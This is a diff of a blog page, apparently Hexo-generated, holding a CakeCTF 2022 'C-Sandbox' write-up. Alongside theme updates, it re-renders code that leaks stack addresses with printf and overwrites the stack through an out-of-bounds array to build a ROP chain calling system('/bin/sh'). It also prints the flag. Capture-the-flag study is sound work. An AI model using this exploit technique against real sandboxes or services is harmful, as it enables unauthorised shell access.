@@ -15,10 +15,10 @@
 
 
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="0x0 IntroductionI designed a restricted C compiler! nc misc.2022.cakectf.com 10099 files: c_sandbox_c85cfad2fce8c0c6ac1dc144a1e4229c.tar.gz 0x1 Walk throughBasically, the server will compile a C progr">
 <meta property="og:type" content="website">
@@ -27,14 +27,13 @@
 <meta property="og:site_name" content="Aynakeya&#39;s Blog">
 <meta property="og:description" content="0x0 IntroductionI designed a restricted C compiler! nc misc.2022.cakectf.com 10099 files: c_sandbox_c85cfad2fce8c0c6ac1dc144a1e4229c.tar.gz 0x1 Walk throughBasically, the server will compile a C progr">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-09-04T20:47:00.000Z">
-<meta property="article:modified_time" content="2022-09-04T20:47:00.000Z">
+<meta property="article:published_time" content="2022-09-04T05:47:00.000Z">
+<meta property="article:modified_time" content="2022-09-04T05:47:00.000Z">
 <meta property="article:author" content="Aynakeya">
 <meta name="twitter:card" content="summary">
 
 
 <link rel="canonical" href="http://www.aynakeya.com/ctf-writeup/2022/cakectf/c-sandbox/">
-
 
 
 <script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"en","comments":true,"permalink":"http://www.aynakeya.com/ctf-writeup/2022/cakectf/c-sandbox/index.html","path":"ctf-writeup/2022/cakectf/c-sandbox/index.html","title":"[Misc] C-Sandbox"}</script>
@@ -46,6 +45,27 @@
 
 
 
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.0/pangu.umd.js" integrity="sha256-JnmRRnJK7DC6RQJbAJb6AXOM9OmWzS6z8eYultk/48Y=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
 
 
 
@@ -105,25 +125,25 @@
 
 
   <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
-
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -160,7 +180,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives">
-          <span class="site-state-item-count">119</span>
+          <span class="site-state-item-count">120</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -171,7 +191,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags">
-        <span class="site-state-item-count">96</span>
+        <span class="site-state-item-count">98</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -228,18 +248,50 @@
 <p>files: <a href="c_sandbox_c85cfad2fce8c0c6ac1dc144a1e4229c.tar.gz">c_sandbox_c85cfad2fce8c0c6ac1dc144a1e4229c.tar.gz</a></p>
 <h1 id="0x1-Walk-through"><a href="#0x1-Walk-through" class="headerlink" title="0x1 Walk through"></a>0x1 Walk through</h1><p>Basically, the server will compile a C program and execute it. But it only allows 4 function to be called.</p>
 <p><code>sandbox.cpp</code></p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Allow these function calls */</span></span><br><span class="line">        <span class="keyword">if</span> (func &amp;&amp; </span><br><span class="line">            (func-&gt;<span class="built_in">getName</span>() == <span class="string">&quot;puts&quot;</span></span><br><span class="line">             || func-&gt;<span class="built_in">getName</span>() == <span class="string">&quot;printf&quot;</span></span><br><span class="line">             || func-&gt;<span class="built_in">getName</span>() == <span class="string">&quot;__isoc99_scanf&quot;</span></span><br><span class="line">             || func-&gt;<span class="built_in">getName</span>() == <span class="string">&quot;exit&quot;</span>))</span><br><span class="line">          <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* Allow these function calls */</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>func <span class="token operator">&amp;&amp;</span> 
+            <span class="token punctuation">(</span>func<span class="token operator">-></span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"puts"</span>
+             <span class="token operator">||</span> func<span class="token operator">-></span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"printf"</span>
+             <span class="token operator">||</span> func<span class="token operator">-></span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"__isoc99_scanf"</span>
+             <span class="token operator">||</span> func<span class="token operator">-></span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+          <span class="token keyword">continue</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>Our goal is to get shell with this restriction. </p>
 <p>My first approach is using <code>asm</code> in C code. However, the sandbox also detect it and prevent me from executing asm codes.</p>
 <p>Then, I tried my second solution. constructing a rop chain. </p>
 <p>Since we can use printf&#x2F;puts in our code. We can simply print out the whole stack and find the libc address. Moreoever, The challenge also provide us a Dockerfile, so we can easily extract libc from it and get the libc functions offsets.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;1.%1$p\n2.%2$p\n3.%3$p\n4.%4$p\n5.%5$p\n6.%6$p\n7.%7$p\n8.%8$p\n&quot;</span></span><br><span class="line">        <span class="string">&quot;9.%9$p\n10.%10$p\n11.%11$p\n12.%12$p\n13.%13$p\n14.%14$p\n15.%15$p\n16.%16$p\n&quot;</span></span><br><span class="line">        );</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span>
+        <span class="token string">"1.%1$p\n2.%2$p\n3.%3$p\n4.%4$p\n5.%5$p\n6.%6$p\n7.%7$p\n8.%8$p\n"</span>
+        <span class="token string">"9.%9$p\n10.%10$p\n11.%11$p\n12.%12$p\n13.%13$p\n14.%14$p\n15.%15$p\n16.%16$p\n"</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>Modify the stack in C is very straighforward, just create a long array and modify the stack value using index.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> x[<span class="number">1</span>];</span><br><span class="line">x[<span class="number">10</span>] = <span class="number">0x1</span> ; <span class="comment">// modify the stack</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+x<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1</span> <span class="token punctuation">;</span> <span class="token comment">// modify the stack</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h1 id="0x2-Solution"><a href="#0x2-Solution" class="headerlink" title="0x2 Solution"></a>0x2 Solution</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> __libc_start_main_ret = <span class="number">0x24083</span>;</span><br><span class="line"><span class="type">long</span> system_o = <span class="number">0x52290</span>;</span><br><span class="line"><span class="type">long</span> str_bin_sh = <span class="number">0x1b45bd</span>;</span><br><span class="line"><span class="type">long</span> pop_rdi_ret = <span class="number">0x23b6a</span>;</span><br><span class="line"><span class="type">long</span> ret_o = <span class="number">0x22679</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> x[<span class="number">1</span>];</span><br><span class="line">    x[<span class="number">0</span>] = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;1.%1$p\n2.%2$p\n3.%3$p\n4.%4$p\n5.%5$p\n6.%6$p\n7.%7$p\n8.%8$p\n&quot;</span></span><br><span class="line">        <span class="string">&quot;9.%9$p\n10.%10$p\n11.%11$p\n12.%12$p\n13.%13$p\n14.%14$p\n15.%15$p\n16.%16$p\n&quot;</span></span><br><span class="line">        );</span><br><span class="line">    </span><br><span class="line">    x[<span class="number">0</span>] = x[<span class="number">2</span>]-__libc_start_main_ret;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,x[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,(<span class="type">char</span> *)(x[<span class="number">0</span>]+str_bin_sh));</span><br><span class="line">    x[<span class="number">2</span>] = x[<span class="number">0</span>] + ret_o;</span><br><span class="line">    x[<span class="number">3</span>] = x[<span class="number">0</span>] + pop_rdi_ret;</span><br><span class="line">    x[<span class="number">4</span>] = x[<span class="number">0</span>] + str_bin_sh;</span><br><span class="line">    x[<span class="number">5</span>] = x[<span class="number">0</span>] + system_o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="0x2-Solution"><a href="#0x2-Solution" class="headerlink" title="0x2 Solution"></a>0x2 Solution</h1><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> __libc_start_main_ret <span class="token operator">=</span> <span class="token number">0x24083</span><span class="token punctuation">;</span>
+<span class="token keyword">long</span> system_o <span class="token operator">=</span> <span class="token number">0x52290</span><span class="token punctuation">;</span>
+<span class="token keyword">long</span> str_bin_sh <span class="token operator">=</span> <span class="token number">0x1b45bd</span><span class="token punctuation">;</span>
+<span class="token keyword">long</span> pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x23b6a</span><span class="token punctuation">;</span>
+<span class="token keyword">long</span> ret_o <span class="token operator">=</span> <span class="token number">0x22679</span><span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">long</span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffffffffffff</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span>
+        <span class="token string">"1.%1$p\n2.%2$p\n3.%3$p\n4.%4$p\n5.%5$p\n6.%6$p\n7.%7$p\n8.%8$p\n"</span>
+        <span class="token string">"9.%9$p\n10.%10$p\n11.%11$p\n12.%12$p\n13.%13$p\n14.%14$p\n15.%15$p\n16.%16$p\n"</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>__libc_start_main_ret<span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>str_bin_sh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> ret_o<span class="token punctuation">;</span>
+    x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> pop_rdi_ret<span class="token punctuation">;</span>
+    x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> str_bin_sh<span class="token punctuation">;</span>
+    x<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> system_o<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h1 id="0x3-Flag-Thoughts"><a href="#0x3-Flag-Thoughts" class="headerlink" title="0x3 Flag &amp; Thoughts"></a>0x3 Flag &amp; Thoughts</h1><p>It is actually more like a pwn problem.</p>
 <p><code>CakeCTF&#123;briI1ng_yoO0ur_oO0wn_gaA4dgeE3t!&#125;</code></p>
@@ -268,7 +320,7 @@
 
   <div class="copyright">
     &copy; 
-    <span itemprop="copyrightYear">2024</span>
+    <span itemprop="copyrightYear">2025</span>
     <span class="with-love">
       <i class="fa fa-heart"></i>
     </span>
@@ -295,28 +347,6 @@
 <noscript>
   <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
 </noscript>
-
-
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
-
-
-
-
-
-
-
-  
-
-
-
-
 
 </body>
 </html>
